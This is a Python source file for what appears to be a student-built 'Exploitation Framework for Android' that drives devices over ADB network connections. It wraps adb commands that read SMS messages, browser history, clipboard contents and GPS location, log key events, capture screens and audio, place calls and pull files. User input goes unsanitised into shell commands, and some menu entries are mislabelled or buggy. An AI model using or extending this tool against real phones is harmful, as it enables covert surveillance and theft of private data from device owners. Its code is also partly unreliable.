#!/usr/bin/env python

import os
import sys
import readline
import random
import time as  t
import rlcompleter

def autocomplete(text, state):
    import readline
    # import rlcompleter
    # readline.parse_and_bind("tab:complete")
    line = readline.get_line_buffer()
    splitted = line.lstrip().split(" ")

    # no space, autocomplete will be the basic commands:
    options = [x + " " for x in actions if x.startswith(text)]
    options.extend([x + " " for x in remap if x.startswith(text)])
    try:
        return options[state]
    except:
        return None

def get_input(prompt, auto_complete_fn=None, basefile_fn=None):
    try:
        if auto_complete_fn != None:
            import readline
            readline.set_completer_delims(' \t\n;/')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(auto_complete_fn)
    except Exception as e:
        pass

    cmd = input("%s" % prompt)
    return cmd.strip()

CurrentDir = os.path.dirname(os.path.abspath(__file__))
readline.set_completer(autocomplete)
readline.parse_and_bind("tab: complete")
WHSL = '\033[0m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
# GNSL = '\033[0;32m'
GNSL = WHSL
load_count = 0
page2 = False

arrow = REDL + "└──>" + WHSL
arrow = str(" "+arrow)
connect = REDL + "│" + WHSL

page_1 = '''{2} 

  ______                _______                _         _         ___                                                   _     
 / _____)              (_______)              | |       (_) _     / __)                                                 | |    
| /  ___  _   _  ____   _____    _   _  ____  | |  ___   _ | |_  | |__   ____   ____  ____    ____  _ _ _   ___    ____ | |  _ 
| | (___)| | | ||  _ \ |  ___)  ( \ / )|  _ \ | | / _ \ | ||  _) |  __) / ___) / _  ||    \  / _  )| | | | / _ \  / ___)| | / )
| \____/| \ V / | | | || |_____  ) X ( | | | || || |_| || || |__ | |   | |    ( ( | || | | |( (/ / | | | || |_| || |    | |< ( 
 \_____/   \_/  |_| |_||_______)(_/ \_)| ||_/ |_| \___/ |_| \___)|_|   |_|     \_||_||_|_|_| \____) \____| \___/ |_|    |_| \_)
                                       | |        
                                       | |                                   BY John S. Madaha
                                       |_|                                                                                     
                                                
  {0}{1}Exploitation Framework for Android.{0}{2}             {0}{1}HomePage: https://github.com/GiovanniJohnArthur/FinalYearProject{0}{2}
        {0}{1}For Android Remote Access{0}{2} 
                       
                        
 {0}{1}1{0} - {2}Show connected devices       {0}{1}10{0} - {2}Shutdown the device      {0}{1}19{0} - {2} Extract apk from app      {0}{1}28{0} - {2}Call a specific number
 {0}{1}2{0} - {2}Disconect all devices        {0}{1}11{0} - {2}Uninstall an app         {0}{1}20{0} - {2} Get Battery Status        {0}{1}29{0} - {2}Get a Location
 {0}{1}3{0} - {2}Connect a new device         {0}{1}12{0} - {2}Show device log          {0}{1}21{0} - {2} Get Network Status        {0}{1}30{0} - {2}Get camera to take a photo
 {0}{1}4{0} - {2}Access device shell          {0}{1}13{0} - {2}Dump System Info         {0}{1}22{0} - {2} Turn WiFi on/off          {0}{1}31{0} - {2}Start a keyloggher
 {0}{1}5{0} - {2}Install an apk on a device   {0}{1}14{0} - {2}List all device apps     {0}{1}23{0} - {2} Remove device password    {0}{1}32{0} - {2}Record Audio
 {0}{1}6{0} - {2}Screen record a device       {0}{1}15{0} - {2}Run a device app         {0}{1}24{0} - {2} Emulate button presses    {0}{1}33{0} - {2}Get SMS
 {0}{1}7{0} - {2}Get device screenshot        {0}{1}16{0} - {2}Port Forwarding          {0}{1}25{0} - {2} Get Current Activity      {0}{1}34{0} - {2}Get Browser History
 {0}{1}8{0} - {2}Restart gvn Server           {0}{1}17{0} - {2}Grab wpa_supplicant      {0}{1}26{0} - {2} Update gvn Framework      {0}{1}35{0} - {2}Clipboard Hijacking
 {0}{1}9{0} - {2}Pull files from device       {0}{1}18{0} - {2}Show Mac/Inet            {0}{1}27{0} - {2} Exit gvn Framework        {0}{1}36{0} - {2}Toggle Flashlight
'''.format(WHSL, WHSL, WHSL)

page_2 = '''\n
'''.format(GNSL, REDL, WHSL)

def main():
    page_num = 1
    option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()

    while(1):
        
        if option == '1' or option == 'show':
            os.system("adb devices -l")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option  ==  '2' or option == 'disconnect':
            os.system("adb disconnect")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '3' or option == 'connect':
            print(("\n{1}[{0}+{1}]{2} Enter a device IP address.").format(REDL, GNSL, WHSL))
            try:
                device_name = input (arrow+" gvn"+GNSL+"("+REDL + "connect" + GNSL + ")"+ENDL + " > ")
            except KeyboardInterrupt:
                main()
            if device_name == '':
                main()
            if device_name == '27' or device_name == 'exit' or device_name == 'quit' or device_name == 'back':
                main()
                
            os.system("adb connect "+device_name+":5555")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option  == '4' or option == 'shell':
            os.system("adb -s "+device_name+" shell")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '5' or option == 'install':
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter the apk location.").format(REDL, GNSL, WHSL))
            apk_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "apk-install" + GNSL + ")"+ENDL + " > ")

            os.system("adb -s  "+device_name+" install "+apk_location)
            print(GNSL  +  "Apk has been installed.")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option ==  '6' or option == 'record':
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Video recording started.").format(REDL, GNSL, WHSL))
            print(("     "+connect))
            os.system("adb -s "+device_name+" shell screenrecord /sdcard/screen.mp4")
            print(("    {1}[{0}+{1}]{2} Enter where you would like to save the video.").format(REDL, GNSL, WHSL))
            place_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "screen-record" + GNSL + ")"+ENDL + " > ")
            
            os.system("adb -s "+device_name+" pull /sdcard/screen.mp4 "+place_location)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option  == '7' or option == 'screenshot':
            os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter where you would like to save the screenshot.").format(REDL, GNSL, WHSL))
            place_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "screenshot" + GNSL + ")"+ENDL + " > ")

            os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '8' or option == 'restart':
            print(("{1}[{0}+{1}]{2} Restarting Giovanni Server...{3}").format(REDL, GNSL, WHSL, ENDL))
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")
            os.system("adb start-server >> /dev/null")
            t.sleep(4)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '9' or option == 'pull-files':
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a file location on a device.").format(REDL, GNSL, WHSL))
            file_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "file-pull" + GNSL + ")"+ENDL + " > ")
            print(("        "+connect))
            print(("       {1}[{0}+{1}]{2} Enter where you would like to save the file.").format(REDL, GNSL, WHSL))
            place_location = input("       "+arrow + " gvn"+GNSL+"("+REDL + "file-pull" + GNSL + ")"+ENDL + " > ")

            os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + "> ")

        elif option == '10' or option == 'shutdown':
            os.system("adb -s "+device_name+ " reboot ")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option ==  '11' or option == 'uninstall':
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " gvn"+GNSL+"("+REDL + "app-delete" + GNSL + ")"+ENDL + " > ")
            os.system("adb -s "+device_name+" unistall "+package_name)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '28' or option == 'call':
            print(("    {1}[{0}+{1}]{2} Enter the phone number to call.").format(REDL, GNSL, WHSL))
            phone_number = input("    " + arrow + " gvn" + GNSL + "(" + REDL + "call" + GNSL + ")" + ENDL + " > ")
            os.system(f"adb -s {device_name} shell am start -a android.intent.action.CALL -d tel:{phone_number}")   
            option = input(ENDL + "gvn" + GNSL + "(" + REDL + "menu" + GNSL + ")" + ENDL + " > ")
        elif option == '29' or option == 'get-location':
            print(("    {1}[{0}+{1}]{2} Getting GPS location...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell dumpsys location | grep 'lastKnownLocation'")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '30' or option == 'take-photo':
            print(("    {1}[{0}+{1}]{2} Taking photo...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell am start -a android.media.action.IMAGE_CAPTURE")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '31' or option == 'start-keylogger':
            print(("    {1}[{0}+{1}]{2} Starting keylogger...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell getevent -l")  # Monitor key events
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '32' or option == 'record-audio':
            print(("    {1}[{0}+{1}]{2} Recording audio...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell am start -a android.provider.MediaStore.RECORD_SOUND")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '33' or option == 'get-sms':
            print(("    {1}[{0}+{1}]{2} Get SMS...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell content query --uri content://sms/")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '34' or option == 'get-browser-history':
            print(("    {1}[{0}+{1}]{2} Get Browser History...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell content query --uri content://browser/bookmarks/ --projection title,url")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '35' or option == 'get-clipboard':
            print(("    {1}[{0}+{1}]{2} Get Clipboard contents...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell service call clipboard 1")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        elif option == '36' or option == 'toggle-flashlight':
            print(("    {1}[{0}+{1}]{2} Toggle Flashlight...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell input keyevent 26")  # Wake up device if needed
            os.system(f"adb -s {device_name} shell am start -a android.media.action.STILL_IMAGE_CAMERA --ez torch true")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")









import os
os.system("printf '\033]2;Giovanni Framework\a'")
print(("{1}[{0}+{1}]{2} Starting Giovanni Server...").format(REDL, GNSL, WHSL))
os.system("adb tcpip 5555 >> /dev/null")
t.sleep(4)
os.system('clear')
print(page_1)
main()